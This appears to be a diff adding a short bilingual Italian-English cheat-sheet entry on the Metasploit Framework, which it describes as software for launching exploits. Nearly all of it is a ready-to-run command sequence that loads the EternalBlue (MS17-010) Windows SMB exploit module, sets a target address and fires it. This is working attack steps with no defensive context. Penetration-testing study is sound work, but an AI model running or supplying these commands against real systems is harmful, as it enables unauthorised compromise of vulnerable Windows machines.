@@ -1,0 +1,11 @@
+Metasploit Framework / Exploitation with Metasploit
+ITA: Il software più potente per lanciare "exploit" (attacchi) contro sistemi vulnerabili.
+ENG: The most powerful software for launching "exploits" (attacks) against vulnerable systems.
+
+Comando:
+
+Bash
+msfconsole
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.100
+exploit
